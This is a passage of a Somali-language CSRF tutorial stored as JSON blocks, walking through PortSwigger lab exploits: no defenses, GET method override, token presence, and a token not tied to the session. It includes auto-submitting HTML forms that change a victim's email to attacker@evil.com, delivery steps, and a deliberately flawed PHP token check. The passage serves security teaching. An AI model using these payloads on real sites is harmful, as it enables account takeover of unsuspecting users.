+     "html": "Bug hunter-ka khibradda leh wuxuu arkaa wax kale. Wuxuu arkaa waxa maqan. Wuxuu arkaa csrf token oo aan jirin. Wuxuu arkaa SameSite oo aan la dhigin. Wuxuu arkaa method oo aan la xaqiijin. Wuxuu arkaa trust boundary oo jaban.",
+     "text": "Bug hunter-ka khibradda leh wuxuu arkaa wax kale. Wuxuu arkaa waxa maqan. Wuxuu arkaa csrf token oo aan jirin. Wuxuu arkaa SameSite oo aan la dhigin. Wuxuu arkaa method oo aan la xaqiijin. Wuxuu arkaa trust boundary oo jaban.",
+     "id": "part-5-b2"
+    },
+    {
+     "type": "para",
+     "html": "Bilowga, waa in aad barato sida loo arko waxa maqan.",
+     "text": "Bilowga, waa in aad barato sida loo arko waxa maqan.",
+     "id": "part-5-b3"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Lab-ka 1: No Defenses ",
+     "text": "Lab-ka 1: No Defenses",
+     "id": "part-5-b4",
+     "slug": "lab-ka-1-no-defenses"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu leeyahay email change functionality oo aan la ilaalin. Ma jiro CSRF token. Ma jiro SameSite. Ma jiro Referer validation. Ma jiro wax.",
+     "text": "Lab-kan wuxuu leeyahay email change functionality oo aan la ilaalin. Ma jiro CSRF token. Ma jiro SameSite. Ma jiro Referer validation. Ma jiro wax.",
+     "id": "part-5-b5"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu ku barayaa waxa ugu muhiimsan: in wax maqan yihiin. \"",
+     "text": "Lab-kan wuxuu ku barayaa waxa ugu muhiimsan: in wax maqan yihiin. \"",
+     "id": "part-5-b6"
+    },
+    {
+     "type": "para",
+     "html": "Marka aad aragto request, ha eegin waxa jira. Eeg waxa maqan. Weydii:",
+     "text": "Marka aad aragto request, ha eegin waxa jira. Eeg waxa maqan. Weydii:",
+     "id": "part-5-b7"
+    },
+    {
+     "type": "para",
+     "html": "1. Ma jiraa CSRF token?",
+     "text": "1. Ma jiraa CSRF token?",
+     "id": "part-5-b8"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Haddi uui maqan yahay → red flag.",
+       "text": "Haddi uui maqan yahay → red flag.",
+       "level": 0
+      },
+      {
+       "html": "Haddi uui jiro → sidee loo xaqiijiyaa?",
+       "text": "Haddi uui jiro → sidee loo xaqiijiyaa?",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b9"
+    },
+    {
+     "type": "para",
+     "html": "2. SameSite maxay tahay?",
+     "text": "2. SameSite maxay tahay?",
+     "id": "part-5-b10"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Hadduu maqan yahay → red flag (default Lax).",
+       "text": "Hadduu maqan yahay → red flag (default Lax).",
+       "level": 0
+      },
+      {
+       "html": "Hadduu <code>None</code> yahay → red flag.",
+       "text": "Hadduu None yahay → red flag.",
+       "level": 0
+      },
+      {
+       "html": "Hadduu <code>Lax</code> yahay → red flag (bypasses).",
+       "text": "Hadduu Lax yahay → red flag (bypasses).",
+       "level": 0
+      },
+      {
+       "html": "Hadduu <code>Strict</code> tahay → adag (laakiin wali bypasses).",
+       "text": "Hadduu Strict tahay → adag (laakiin wali bypasses).",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b11"
+    },
+    {
+     "type": "para",
+     "html": "3. Ma jiraa Referer/Origin validation?",
+     "text": "3. Ma jiraa Referer/Origin validation?",
+     "id": "part-5-b12"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Haddii uu maqan yahay → red flag.",
+       "text": "Haddii uu maqan yahay → red flag.",
+       "level": 0
+      },
+      {
+       "html": "Haddii uu jiro → sidee loo xaqiijiyaa?",
+       "text": "Haddii uu jiro → sidee loo xaqiijiyaa?",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b13"
+    },
+    {
+     "type": "para",
+     "html": "4. Ma jiraa custom header?",
+     "text": "4. Ma jiraa custom header?",
+     "id": "part-5-b14"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Haddii uu maqan yahay → red flag.",
+       "text": "Haddii uu maqan yahay → red flag.",
+       "level": 0
+      },
+      {
+       "html": "Haddii uu jiro → sidee loo xaqiijiyaa?",
+       "text": "Haddii uu jiro → sidee loo xaqiijiyaa?",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b15"
+    },
+    {
+     "type": "para",
+     "html": "5. Method-ku maxay tahay?",
+     "text": "5. Method-ku maxay tahay?",
+     "id": "part-5-b16"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Haddii <code>GET</code> uu beddelo state → red flag.",
+       "text": "Haddii GET uu beddelo state → red flag.",
+       "level": 0
+      },
+      {
+       "html": "Haddii <code>POST</code> uu beddelo state → sax (laakiin wali CSRF wuu jiri karaa).",
+       "text": "Haddii POST uu beddelo state → sax (laakiin wali CSRF wuu jiri karaa).",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b17"
+    },
+    {
+     "type": "para",
+     "html": "Waxa maqan ayaa muhiim. Waxa maqan ayaa furaha ah. Waxa maqan ayaa vulnerability-ka ah.",
+     "text": "Waxa maqan ayaa muhiim. Waxa maqan ayaa furaha ah. Waxa maqan ayaa vulnerability-ka ah.",
+     "id": "part-5-b18"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Tijaabinta ",
+     "text": "Tijaabinta",
+     "id": "part-5-b19",
+     "slug": "tijaabinta"
+    },
+    {
+     "type": "para",
+     "html": "Fiiro gaar ah labyada waxay ku jiraan portswigger",
+     "text": "Fiiro gaar ah labyada waxay ku jiraan portswigger",
+     "callout": "note",
+     "id": "part-5-b20"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 1: Login",
+     "text": "Tallaabo 1: Login",
+     "id": "part-5-b21"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Login <code>wiener</code><code>:peter</code>.",
+       "text": "Login wiener:peter.",
+       "level": 0
+      },
+      {
+       "html": "Tag My Account &gt; Update email.",
+       "text": "Tag My Account > Update email.",
+       "level": 0
+      },
+      {
+       "html": "Geli email tusaale <code>test@test.com</code>.",
+       "text": "Geli email tusaale test@test.com.",
+       "level": 0
+      },
+      {
+       "html": "Submit.",
+       "text": "Submit.",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b22"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 2: Eeg Burp",
+     "text": "Tallaabo 2: Eeg Burp",
+     "id": "part-5-b23"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Burp &gt; Proxy &gt; HTTP history.",
+       "text": "Burp > Proxy > HTTP history.",
+       "level": 0
+      },
+      {
+       "html": "Raadi <code>POST /my-account/change-email</code>.",
+       "text": "Raadi POST /my-account/change-email.",
+       "level": 0
+      },
+      {
+       "html": "Eeg request-ka:",
+       "text": "Eeg request-ka:",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b24"
+    },
+    {
+     "type": "code",
+     "lang": "http",
+     "lines": [
+      "POST /my-account/change-email HTTP/1.1",
+      "Host: LAB-ID.web-security-academy.net",
+      "Cookie: session=WIENER_SESSION",
+      "Content-Type: application/x-www-form-urlencoded",
+      "",
+      "email=test@test.com"
+     ],
+     "id": "part-5-b25"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 3: Falanqee",
+     "text": "Tallaabo 3: Falanqee",
+     "id": "part-5-b26"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Ma jiro CSRF token → red flag.",
+       "text": "Ma jiro CSRF token → red flag.",
+       "level": 0
+      },
+      {
+       "html": "Cookie-ga SameSite maqan → red flag.",
+       "text": "Cookie-ga SameSite maqan → red flag.",
+       "level": 0
+      },
+      {
+       "html": "Ma jiro Referer validation → red flag.",
+       "text": "Ma jiro Referer validation → red flag.",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b27"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 4: Tijaabi",
+     "text": "Tallaabo 4: Tijaabi",
+     "id": "part-5-b28"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Samee HTML exploit:",
+       "text": "Samee HTML exploit:",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b29"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<form method=\"POST\" action=\"https://LAB-ID.web-security-academy.net/my-account/change-email\">",
+      "    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">",
+      "</form>",
+      "<script>document.forms[0].submit();</script>"
+     ],
+     "id": "part-5-b30"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Exploit server &gt; Body &gt; Store.",
+       "text": "Exploit server > Body > Store.",
+       "level": 0
+      },
+      {
+       "html": "View exploit.",
+       "text": "View exploit.",
+       "level": 0
+      },
+      {
+       "html": "Hubi in email-kaaga is beddelay.",
+       "text": "Hubi in email-kaaga is beddelay.",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b31"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 5: Deliver",
+     "text": "Tallaabo 5: Deliver",
+     "id": "part-5-b32"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel email-ka.",
+       "text": "Beddel email-ka.",
+       "level": 0
+      },
+      {
+       "html": "Store.",
+       "text": "Store.",
+       "level": 0
+      },
+      {
+       "html": "Deliver to victim.",
+       "text": "Deliver to victim.",
+       "level": 0
+      },
+      {
+       "html": "Lab solved.",
+       "text": "Lab solved.",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b33"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu ku barayaa:",
+     "text": "Lab-kan wuxuu ku barayaa:",
+     "id": "part-5-b34"
+    },
+    {
+     "type": "para",
+     "html": "1. Waxa maqan ayaa muhiim.Ha eegi waxa jira oo kaliya. Eeg waxa maqan. Waa waxa maqan oo vulnerability-",
+     "text": "1. Waxa maqan ayaa muhiim.Ha eegi waxa jira oo kaliya. Eeg waxa maqan. Waa waxa maqan oo vulnerability-",
+     "id": "part-5-b35"
+    },
+    {
+     "type": "para",
+     "html": "2. Fudeydka waa khatar.Developer-ku waa insaan caajis badan , fudeydka ayuu ka jecelyahay shaqada badan sidaa darteed difaaca wuu daciifiyaa.",
+     "text": "2. Fudeydka waa khatar.Developer-ku waa insaan caajis badan , fudeydka ayuu ka jecelyahay shaqada badan sidaa darteed difaaca wuu daciifiyaa.",
+     "id": "part-5-b36"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Lab-ka 2: Method Override ",
+     "text": "Lab-ka 2: Method Override",
+     "id": "part-5-b37",
+     "slug": "lab-ka-2-method-override"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Fikradda Lab-kan",
+     "text": "Fikradda Lab-kan",
+     "id": "part-5-b38",
+     "slug": "fikradda-lab-kan"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu leeyahay CSRF token oo lagu xaqiijiyay POST kaliya. Markaad u beddesho GET, token-ka lama xaqiijiyo.",
+     "text": "Lab-kan wuxuu leeyahay CSRF token oo lagu xaqiijiyay POST kaliya. Markaad u beddesho GET, token-ka lama xaqiijiyo.",
+     "id": "part-5-b39"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu ku barayaa in method-ku uu muhiim yahay. Wuxuu ku barayaa in developers-ku ay u male-awaalaan in method-ku uu yahay defense. Laakiin method-ku ma aha defense. Waa signal. Waa marker. Waa assumption.",
+     "text": "Lab-kan wuxuu ku barayaa in method-ku uu muhiim yahay. Wuxuu ku barayaa in developers-ku ay u male-awaalaan in method-ku uu yahay defense. Laakiin method-ku ma aha defense. Waa signal. Waa marker. Waa assumption.",
+     "id": "part-5-b40"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Falsafadda Method-ka",
+     "text": "Falsafadda Method-ka",
+     "id": "part-5-b41",
+     "slug": "falsafadda-method-ka"
+    },
+    {
+     "type": "para",
+     "html": "HTTP wuxuu leeyahay methods oo leh macne:",
+     "text": "HTTP wuxuu leeyahay methods oo leh macne:",
+     "id": "part-5-b42"
+    },
+    {
+     "type": "table",
+     "rows": [
+      [
+       "Method",
+       "Macnaha",
+       "State-Changing?"
+      ],
+      [
+       "<code>GET</code>",
+       "Akhri xogta",
+       "Maya (waa in aanu beddelin)"
+      ],
+      [
+       "<code>POST</code>",
+       "Beddel state",
+       "Haa"
+      ],
+      [
+       "<code>PUT</code>",
+       "Abuur/beddel resource",
+       "Haa"
+      ],
+      [
+       "<code>DELETE</code>",
+       "Tirtir resource",
+       "Haa"
+      ],
+      [
+       "<code>PATCH</code>",
+       "Beddel qayb",
+       "Haa"
+      ]
+     ],
+     "id": "part-5-b43"
+    },
+    {
+     "type": "para",
+     "html": "Developers-ku wuxuu u qaataa:",
+     "text": "Developers-ku wuxuu u qaataa:",
+     "id": "part-5-b44"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>GET</code> = safe = ma u baahna CSRF token.",
+       "text": "GET = safe = ma u baahna CSRF token.",
+       "level": 0
+      },
+      {
+       "html": "<code>POST</code> = state-changing = wuxuu u baahan yahay CSRF token.",
+       "text": "POST = state-changing = wuxuu u baahan yahay CSRF token.",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b45"
+    },
+    {
+     "type": "para",
+     "html": "Haddii server-ku uu xaqiijiyo token-ka kaliya marka method-ku yahay <code>POST</code>, attacker-ku wuxuu u beddelaa <code>GET</code>. Markaas token-ka lama xaqiijiyo.",
+     "text": "Haddii server-ku uu xaqiijiyo token-ka kaliya marka method-ku yahay POST, attacker-ku wuxuu u beddelaa GET. Markaas token-ka lama xaqiijiyo.",
+     "id": "part-5-b46"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Sida Loo Tijaabiyo",
+     "text": "Sida Loo Tijaabiyo",
+     "id": "part-5-b47",
+     "slug": "sida-loo-tijaabiyo"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 1: Login",
+     "text": "Tallaabo 1: Login",
+     "id": "part-5-b48"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Login, change email, eeg Burp.",
+       "text": "Login, change email, eeg Burp.",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b49"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 2: Tijaabi token-ka",
+     "text": "Tallaabo 2: Tijaabi token-ka",
+     "id": "part-5-b50"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Repeater ku dir request-ka.",
+       "text": "Repeater ku dir request-ka.",
+       "level": 0
+      },
+      {
+       "html": "Beddel <code>csrf</code> token-ka → waa la diiday.",
+       "text": "Beddel csrf token-ka → waa la diiday.",
+       "level": 0
+      },
+      {
+       "html": "Token-ka waa la xaqiijiyaa.",
+       "text": "Token-ka waa la xaqiijiyaa.",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b51"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 3: Beddel method",
+     "text": "Tallaabo 3: Beddel method",
+     "id": "part-5-b52"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Right-click &gt; Change request method → GET.",
+       "text": "Right-click > Change request method → GET.",
+       "level": 0
+      },
+      {
+       "html": "Riix Send.",
+       "text": "Riix Send.",
+       "level": 0
+      },
+      {
+       "html": "Haddii la aqbalo → waa vulnerable.",
+       "text": "Haddii la aqbalo → waa vulnerable.",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b53"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 4: Samee exploit",
+     "text": "Tallaabo 4: Samee exploit",
+     "id": "part-5-b54"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "<form action=\"https://LAB-ID.web-security-academy.net/my-account/change-email\">",
+      "    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">",
+      "</form>",
+      "<script>document.forms[0].submit();</script>"
+     ],
+     "id": "part-5-b55"
+    },
+    {
+     "type": "para",
+     "html": "Ma jiro <code>method=\"POST\"</code> → GET ayaa la isticmaalaa.",
+     "text": "Ma jiro method=\"POST\" → GET ayaa la isticmaalaa.",
+     "id": "part-5-b56"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 5: Deliver",
+     "text": "Tallaabo 5: Deliver",
+     "id": "part-5-b57"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel email-ka, Store, Deliver.",
+       "text": "Beddel email-ka, Store, Deliver.",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b58"
+    },
+    {
+     "type": "para",
+     "html": "Tijaabi <code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>DELETE</code>. Mid kastaa wuxuu leeyahay dabeecad gaar ah.",
+     "text": "Tijaabi GET, POST, PUT, DELETE. Mid kastaa wuxuu leeyahay dabeecad gaar ah.",
+     "id": "part-5-b59"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Lab-ka 3: Token Presence ",
+     "text": "Lab-ka 3: Token Presence",
+     "id": "part-5-b60",
+     "slug": "lab-ka-3-token-presence"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu leeyahay CSRF token oo lagu xaqiijiyay kaliya haddii uu jiro. Haddii aad tirtirto token-ka, server-ku wuu aqbalayaa.",
+     "text": "Lab-kan wuxuu leeyahay CSRF token oo lagu xaqiijiyay kaliya haddii uu jiro. Haddii aad tirtirto token-ka, server-ku wuu aqbalayaa.",
+     "id": "part-5-b61"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu ku barayaa in jiritaanku aanu ahayn xaqiijin. Wuxuu ku barayaa in \"checking\" aanu ahayn \"validating\".",
+     "text": "Lab-kan wuxuu ku barayaa in jiritaanku aanu ahayn xaqiijin. Wuxuu ku barayaa in \"checking\" aanu ahayn \"validating\".",
+     "id": "part-5-b62"
+    },
+    {
+     "type": "para",
+     "html": "Developers-ku waxay isku daraan jiritaanka iyo xaqiijinta. Waxay yiraahdaan:",
+     "text": "Developers-ku waxay isku daraan jiritaanka iyo xaqiijinta. Waxay yiraahdaan:",
+     "id": "part-5-b63"
+    },
+    {
+     "type": "code",
+     "lang": "php",
+     "lines": [
+      "if (isset($_POST['csrf'])) {",
+      "    if ($_POST['csrf'] !== $_SESSION['csrf']) {",
+      "        die(\"Invalid CSRF token\");",
+      "    }",
+      "}"
+     ],
+     "id": "part-5-b64"
+    },
+    {
+     "type": "para",
+     "html": "Haddii token-ka maqan yahay, <code>isset(</code><code>)</code> wuxuu noqdaa <code>false</code>, marka <code>if</code>-ku wuu boodaa. Server-ku wuu aqbalayaa request-ka.",
+     "text": "Haddii token-ka maqan yahay, isset() wuxuu noqdaa false, marka if-ku wuu boodaa. Server-ku wuu aqbalayaa request-ka.",
+     "id": "part-5-b65"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "tijaabinta",
+     "text": "tijaabinta",
+     "id": "part-5-b66",
+     "slug": "tijaabinta"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 1: Login",
+     "text": "Tallaabo 1: Login",
+     "id": "part-5-b67"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Login, change email, eeg Burp.",
+       "text": "Login, change email, eeg Burp.",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b68"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 2: Tijaabi token-ka",
+     "text": "Tallaabo 2: Tijaabi token-ka",
+     "id": "part-5-b69"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Repeater ku dir request-ka.",
+       "text": "Repeater ku dir request-ka.",
+       "level": 0
+      },
+      {
+       "html": "Beddel <code>csrf</code> token-ka → waa la diiday.",
+       "text": "Beddel csrf token-ka → waa la diiday.",
+       "level": 0
+      },
+      {
+       "html": "Gunaanad: Token-ka waa la xaqiijiyaa.",
+       "text": "Gunaanad: Token-ka waa la xaqiijiyaa.",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b70"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 3: Tirtir token-ka",
+     "text": "Tallaabo 3: Tirtir token-ka",
+     "id": "part-5-b71"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Repeater ku dir request-ka.",
+       "text": "Repeater ku dir request-ka.",
+       "level": 0
+      },
+      {
+       "html": "Tirtir <code>csrf</code> parameter oo dhan.",
+       "text": "Tirtir csrf parameter oo dhan.",
+       "level": 0
+      },
+      {
+       "html": "Riix Send.",
+       "text": "Riix Send.",
+       "level": 0
+      },
+      {
+       "html": "Haddii la aqbalo → waa vulnerable.",
+       "text": "Haddii la aqbalo → waa vulnerable.",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b72"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 4: Samee exploit",
+     "text": "Tallaabo 4: Samee exploit",
+     "id": "part-5-b73"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<form method=\"POST\" action=\"https://LAB-ID.web-security-academy.net/my-account/change-email\">",
+      "    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">",
+      "</form>",
+      "<script>document.forms[0].submit();</script>"
+     ],
+     "id": "part-5-b74"
+    },
+    {
+     "type": "para",
+     "html": "Ogeysiis: Ma jiro <code>csrf</code> input.",
+     "text": "Ogeysiis: Ma jiro csrf input.",
+     "callout": "note",
+     "id": "part-5-b75"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 5: Deliver",
+     "text": "Tallaabo 5: Deliver",
+     "id": "part-5-b76"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel email-ka, Store, Deliver.",
+       "text": "Beddel email-ka, Store, Deliver.",
+       "level": 0
+      }
+     ],
+     "id": "part-5-b77"
+    }
+   ],
+   "id": "part-5",
+   "index": 5
+  },
+  {
+   "title": "QAYBTA VI — DHEXDHEXAAD BYPASSES",
+   "blocks": [
+    {
+     "type": "para",
+     "html": "Waxaa jira dhibaato falsafadeed oo ku jirta amniga cyberka. Dhibaatadu waa composition. Waa isku darka qaybaha.",
+     "text": "Waxaa jira dhibaato falsafadeed oo ku jirta amniga cyberka. Dhibaatadu waa composition. Waa isku darka qaybaha.",
+     "id": "part-6-b0"
+    },
+    {
+     "type": "para",
+     "html": "Aan tusaale keeno. Aan yiraahdo waxaan hayaa laba qaybood:",
+     "text": "Aan tusaale keeno. Aan yiraahdo waxaan hayaa laba qaybood:",
+     "id": "part-6-b1"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Qaybta 1: Waa ammaan.",
+       "text": "Qaybta 1: Waa ammaan.",
+       "level": 0
+      },
+      {
+       "html": "Qaybta 2: Waa ammaan.",
+       "text": "Qaybta 2: Waa ammaan.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b2"
+    },
+    {
+     "type": "para",
+     "html": "Su'aal: Isku darkooda ma ammaan baa?",
+     "text": "Su'aal: Isku darkooda ma ammaan baa?",
+     "id": "part-6-b3"
+    },
+    {
+     "type": "para",
+     "html": "Jawaab: Maya. Ma aha had iyo jeer.",
+     "text": "Jawaab: Maya. Ma aha had iyo jeer.",
+     "id": "part-6-b4"
+    },
+    {
+     "type": "para",
+     "html": "Laba qaybood oo ammaan ayaa isku daray si ay u sameeyaan vulnerability. Mid kastaa waa ammaan. Laakiin isku darkooda waa khatar.",
+     "text": "Laba qaybood oo ammaan ayaa isku daray si ay u sameeyaan vulnerability. Mid kastaa waa ammaan. Laakiin isku darkooda waa khatar.",
+     "id": "part-6-b5"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Lab-ka : Token Not Tied to Session ",
+     "text": "Lab-ka : Token Not Tied to Session",
+     "id": "part-6-b6",
+     "slug": "lab-ka-token-not-tied-to-session"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu leeyahay CSRF token. Token-ku wuu jiraa. Laakiin laguma xiriirin session-ka. Token-ka user A wuxuu u shaqeyn karaa user B.",
+     "text": "Lab-kan wuxuu leeyahay CSRF token. Token-ku wuu jiraa. Laakiin laguma xiriirin session-ka. Token-ka user A wuxuu u shaqeyn karaa user B.",
+     "id": "part-6-b7"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu ku barayaa farqiqa u dhexeeya identity iyo possession. Wuxuu ku barayaa in token-ku uu yahay \"valid\" laakiin aanu ahayn \"belonging\".",
+     "text": "Lab-kan wuxuu ku barayaa farqiqa u dhexeeya identity iyo possession. Wuxuu ku barayaa in token-ku uu yahay \"valid\" laakiin aanu ahayn \"belonging\".",
+     "id": "part-6-b8"
+    },
+    {
+     "type": "para",
+     "html": "Aan si qoto dheer u fikirono. Maxay tahay \"token valid\"?",
+     "text": "Aan si qoto dheer u fikirono. Maxay tahay \"token valid\"?",
+     "id": "part-6-b9"
+    },
+    {
+     "type": "para",
+     "html": "Jawaabtu waxay ku xiran tahay perspective:",
+     "text": "Jawaabtu waxay ku xiran tahay perspective:",
+     "id": "part-6-b10"
+    },
+    {
+     "type": "para",
+     "html": "Perspective 1: Server-ku wuxuu yiraahdaa:",
+     "text": "Perspective 1: Server-ku wuxuu yiraahdaa:",
+     "id": "part-6-b11"
+    },
+    {
+     "type": "para",
+     "html": "\"Token-ku waa valid haddii uu ku jiro liiska token-yada.\"",
+     "text": "\"Token-ku waa valid haddii uu ku jiro liiska token-yada.\"",
+     "id": "part-6-b12"
+    },
+    {
+     "type": "para",
+     "html": "Perspective 2: User-ku wuxuu yiraahdaa:",
+     "text": "Perspective 2: User-ku wuxuu yiraahdaa:",
+     "id": "part-6-b13"
+    },
+    {
+     "type": "para",
+     "html": "\"Token-ku waa valid haddii uu aniga ii gaar yahay.\"",
+     "text": "\"Token-ku waa valid haddii uu aniga ii gaar yahay.\"",
+     "id": "part-6-b14"
+    },
+    {
+     "type": "para",
+     "html": "Perspective 3: Attacker-ku wuxuu yiraahdaa:",
+     "text": "Perspective 3: Attacker-ku wuxuu yiraahdaa:",
+     "id": "part-6-b15"
+    },
+    {
+     "type": "para",
+     "html": "\"Token-ku waa valid haddii uu shaqeyn karo.\"",
+     "text": "\"Token-ku waa valid haddii uu shaqeyn karo.\"",
+     "id": "part-6-b16"
+    },
+    {
+     "type": "para",
+     "html": "Saddexdan perspective waa kala duwan. Server-ku wuxuu ku fikiraa validity. User-ku wuxuu ku fikiraa ownership. Attacker-ku wuxuu ku fikiraa usability.",
+     "text": "Saddexdan perspective waa kala duwan. Server-ku wuxuu ku fikiraa validity. User-ku wuxuu ku fikiraa ownership. Attacker-ku wuxuu ku fikiraa usability.",
+     "id": "part-6-b17"
+    },
+    {
+     "type": "para",
+     "html": "Server-ku wuxuu isticmaalaa validity si uu u xaqiijiyo ownership. Laakiin validity ma aha ownership. Waa category error.",
+     "text": "Server-ku wuxuu isticmaalaa validity si uu u xaqiijiyo ownership. Laakiin validity ma aha ownership. Waa category error.",
+     "id": "part-6-b18"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-6-b19"
+    },
+    {
+     "type": "code",
+     "lang": "t",
+     "lines": [
+      "Token A: valid ✅",
+      "Token B: valid ✅",
+      "Token A belongs to user A ✅",
+      "Token B belongs to user B ✅",
+      "Token A works for user B ❌ (laakiin server-ku wuu aqbalayaa)"
+     ],
+     "id": "part-6-b20"
+    },
+    {
+     "type": "para",
+     "html": ": Server-ku wuxuu isku darayaa \"valid\" iyo \"belongs to\". Wuxuu u malaynayaa: \"Haddii token-ku valid yahay, waa kan user-ka.\" Laakiin validity waa global. Ownership waa local. Waa kala duwan yahay.",
+     "text": ": Server-ku wuxuu isku darayaa \"valid\" iyo \"belongs to\". Wuxuu u malaynayaa: \"Haddii token-ku valid yahay, waa kan user-ka.\" Laakiin validity waa global. Ownership waa local. Waa kala duwan yahay.",
+     "id": "part-6-b21"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Aan tijaabino",
+     "text": "Aan tijaabino",
+     "id": "part-6-b22",
+     "slug": "aan-tijaabino"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 1: Login account A",
+     "text": "Tallaabo 1: Login account A",
+     "id": "part-6-b23"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Login <code>wiener</code><code>:peter</code>.",
+       "text": "Login wiener:peter.",
+       "level": 0
+      },
+      {
+       "html": "Change email, eeg Burp.",
+       "text": "Change email, eeg Burp.",
+       "level": 0
+      },
+      {
+       "html": "Qabo token-ka: <code>WIENER_TOKEN</code>.",
+       "text": "Qabo token-ka: WIENER_TOKEN.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b24"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 2: Login account B (incognito)",
+     "text": "Tallaabo 2: Login account B (incognito)",
+     "id": "part-6-b25"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Login <code>carlos</code><code>:montoya</code>.",
+       "text": "Login carlos:montoya.",
+       "level": 0
+      },
+      {
+       "html": "Change email, eeg Burp.",
+       "text": "Change email, eeg Burp.",
+       "level": 0
+      },
+      {
+       "html": "Qabo token-ka: <code>CARLOS_TOKEN</code>.",
+       "text": "Qabo token-ka: CARLOS_TOKEN.",
+       "level": 0
+      }
